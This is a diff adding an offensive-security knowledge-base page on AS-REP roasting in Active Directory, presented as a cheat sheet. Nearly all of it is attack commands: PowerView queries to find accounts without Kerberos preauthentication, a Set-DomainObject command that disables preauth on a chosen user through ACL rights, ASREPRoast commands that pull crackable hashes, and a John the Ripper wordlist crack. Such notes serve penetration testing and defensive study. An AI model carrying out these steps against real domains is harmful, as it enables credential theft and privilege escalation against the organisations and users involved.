@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <title>offsecvault - Knowledge Base</title>
+  <!--------------------->
+  <!-- b0ydC owned. -->
+  <!-- --------------- -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="utf-8" />
+
+  <style>
+    body {
+      font-size: 12px;
+      font-family: ubuntu mono;
+      background-color: white;
+      color: black;
+      margin: 0;
+    }
+
+    a {
+      color: black;
+      font-weight: bold;
+      text-decoration: none;
+    }
+
+    a:hover,
+    a:active {
+      color: #868686;
+      text-decoration: underline;
+    }
+    table, th, td {
+    border: 1px solid black;
+    border-collapse: collapse;
+    }
+
+    table.center {
+    margin-left: auto; 
+    margin-right: auto;
+}
+    
+  </style>
+</head>
+
+<body>
+  <pre><center>
+<a href="/index.html" style="text-decoration:none;">
+ ▒█████    █████▒ █████▒ ██████ ▓█████  ▄████▄ ██▒   █▓ ▄▄▄       █    ██  ██▓  ▄▄▄█████▓
+▒██▒  ██▒▓██   ▒▓██   ▒▒██    ▒ ▓█   ▀ ▒██▀ ▀█▓██░   █▒▒████▄     ██  ▓██▒▓██▒  ▓  ██▒ ▓▒
+▒██░  ██▒▒████ ░▒████ ░░ ▓██▄   ▒███   ▒▓█    ▄▓██  █▒░▒██  ▀█▄  ▓██  ▒██░▒██░  ▒ ▓██░ ▒░
+▒██   ██░░▓█▒  ░░▓█▒  ░  ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒▒██ █░░░██▄▄▄▄██ ▓▓█  ░██░▒██░  ░ ▓██▓ ░ 
+░ ████▓▒░░▒█░   ░▒█░   ▒██████▒▒░▒████▒▒ ▓███▀ ░ ▒▀█░   ▓█   ▓██▒▒▒█████▓ ░██████▒▒██▒ ░ 
+░ ▒░▒░▒░  ▒ ░    ▒ ░   ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░ ░ ▐░   ▒▒   ▓▒█░░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   
+  ░ ▒ ▒░  ░      ░     ░ ░▒  ░ ░ ░ ░  ░  ░  ▒    ░ ░░    ▒   ▒▒ ░░░▒░ ░ ░ ░ ░ ▒  ░  ░    
+░ ░ ░ ▒   ░ ░    ░ ░   ░  ░  ░     ░   ░           ░░    ░   ▒    ░░░ ░ ░   ░ ░   ░      
+    ░ ░                      ░     ░  ░░ ░          ░        ░  ░   ░         ░  ░       
+                                       ░           ░                                     
+</a></pre>
+
+<div style="font-size:24px; text-align:center; font-family:courier,monospace;">
+    <a href="../../RED-TEAM.html">OFFENSIVE</a> |
+    <a href="../../BLUE-TEAM.html">DEFENSIVE</a> |
+    <a href="../../CTF.html">CTF</a> |
+    <a href="../../TOOLS.html">TOOLS</a> |
+    <a href="../../ABOUT.html">ABOUT</a> 
+</div>
+<pre style="text-align:center;">
+<h3> PRIVESC - KERBEROAST AS-REPs </h3>
+
+If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. 
+Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline.
+
+With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well.
+
+<b>::: Enumerating accounts with Kerberos Preauthdisabled</b>
+
+- Using PowerView
+
+PS> Get-DomainUser -PreauthNotRequired -Verbose
+
+- Using ActiveDirectorymodule
+
+PS> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
+
+Force disable Kerberos Preauth:
+
+<b> ENUMERATE THE PERMISSIONS FOR RDPUsers ON ACLs USING PowerView</b>
+
+PS> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+
+PS> Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} –Verbose
+
+PS> Get-DomainUser -PreauthNotRequired -Verbose
+
+Request encrypted AS-REP for offline brute-force
+
+Let's use ASREPRoast
+
+PS> Get-ASREPHash -UserName VPN1user -Verbose
+
+To enumerate all users with Kerberos preauthdisabled and request a hash
+
+PS> Invoke-ASREPRoast -Verbose
+
+We can use John The Ripper to brute-force the hashes offline
+
+PS> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt
+
+</center>
+</body>
+</html>
